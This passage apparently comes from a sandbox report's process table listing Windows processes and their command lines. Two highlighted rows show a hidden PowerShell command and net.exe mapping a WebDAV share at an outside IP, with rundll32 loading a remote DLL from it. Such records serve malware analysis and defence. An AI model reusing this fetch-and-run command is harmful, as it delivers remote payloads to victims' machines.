'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xd833767020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2323px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1880</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files &#x28;x86&#x29;&#x5c;Microsoft&#x5c;Edge&#x5c;Application&#x5c;msedge.exe --type&#x3d;renderer --disable-gpu-compositing --lang&#x3d;en-US --js-flags&#x3d;--ms-user-locale&#x3d; --device-scale-factor&#x3d;1 --num-raster-threads&#x3d;1 --renderer-client-id&#x3d;153 --time-ticks-at-unix-epoch&#x3d;-1720089883345586 --launch-time-ticks&#x3d;1222488836 --field-trial-handle&#x3d;10948,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle&#x3d;7820 &#x2f;prefetch&#x3a;1</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2346px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7428</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>audiodg.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;AUDIODG.EXE 0x4f0</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2369px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1920</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x2353d002cd8 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2392px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6388</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchProtocol</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;SearchProtocolHost.exe Global&#x5c;UsGthrFltPipeMssGthrPipe3_ Global&#x5c;UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 &quot;Software&#x5c;Microsoft&#x5c;Windows Search&quot; &quot;Mozilla&#x2f;4.0 &#x28;compatible&#x3b; MSIE 6.0&#x3b; Windows NT&#x3b; MS Search 4.0 Robot&#x29;&quot; &quot;C&#x3a;&#x5c;ProgramData&#x5c;Microsoft&#x5c;Search&#x5c;Data&#x5c;Temp&#x5c;usgthrsvc&quot; &quot;DownLevelDaemon&quot; </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2415px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6404</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x9608fea020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2438px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8864</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchFilterHo</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;SearchFilterHost.exe 0 804 808 816 8192 812 788 </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2461px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2820</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>smartscreen.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;smartscreen.exe -Embedding</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2484px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>9112</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>wordpad.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files&#x5c;Windows NT&#x5c;Accessories&#x5c;wordpad.exe </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2507px; height:23px; width:262px;'><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fwb fnal f10 tar nW'><div class = 'w100'>3692</div></div><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fwb fnal f10 nW'><div class = 'w100'>powershell.exe</div></div><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fwb fnal f10 nW'><div class = 'w100'>powershell.exe  -windowstyle hidden net use &#x5c;&#x5c;45.9.74.32&#x40;8888&#x5c;davwwwroot&#x5c; &#x3b; rundll32 &#x5c;&#x5c;45.9.74.32&#x40;8888&#x5c;davwwwroot&#x5c;3435.dll,entry</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2530px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6892</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>conhost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>&#x5c;&#x3f;&#x3f;&#x5c;C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;conhost.exe 0x4</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2553px; height:23px; width:262px;'><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fwb fnal f10 tar nW'><div class = 'w100'>2416</div></div><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fwb fnal f10 nW'><div class = 'w100'>net.exe</div></div><div style='font-weight:bold;font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fwb fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;net.exe use &#x5c;&#x5c;45.9.74.32&#x40;8888&#x5c;davwwwroot&#x5c;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2576px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>832</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k PrintWorkflow</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div></div></div></div><script  type="text/javascript">function checkAndAddZIndex(){ var rows = document.querySelectorAll(".row"); var span = document.createElement("span"); document.body.appendChild(span);for (var r = 0; r < rows.length; r++) { var row = rows[r]; var cols = row.children; var cLen = cols.length; for (var c = cLen - 1; c >= 0; c--) { var cell = cols[c]; var val = cell.innerText; var cellWidth = cell.offsetWidth;if (val) { span.innerText = val; var spanWidth = span.offsetWidth; if (spanWidth > cellWidth) { var classList = cell.classList; var itrateLeft = 0;if (classList.contains("tar") || classList.contains("far")) { itrateLeft = spanWidth - cellWidth; } else if (classList.contains("fac") || classList.contains("tac")) { itrateLeft = (spanWidth / 2) - (cellWidth / 2); }if (itrateLeft) { var zIndex = cell.style.zIndex; ItrateAndChangeZindex(itrateLeft, cols, c - 1, zIndex); } } } } } span.remove(); };function ItrateAndChangeZindex(left, colArray, sIdx, zIndex) { var changeAll = false; for (var i = sIdx; i >= 0; i--) { var cell = colArray[i]; var cellWidth = cell.offsetWidth; if (left > 0) { left = left - cellWidth; if(cell.innerText.trim() || changeAll){ cell.style.zIndex = parseInt(zIndex) + 1; changeAll = true; } } } }window.addEventListener("load", function(){ checkAndAddZIndex(); });</script><script  type="text/javascript">setTimeout(function() {window.close();}, 5000 * 60 );</script></BODY></HTML>
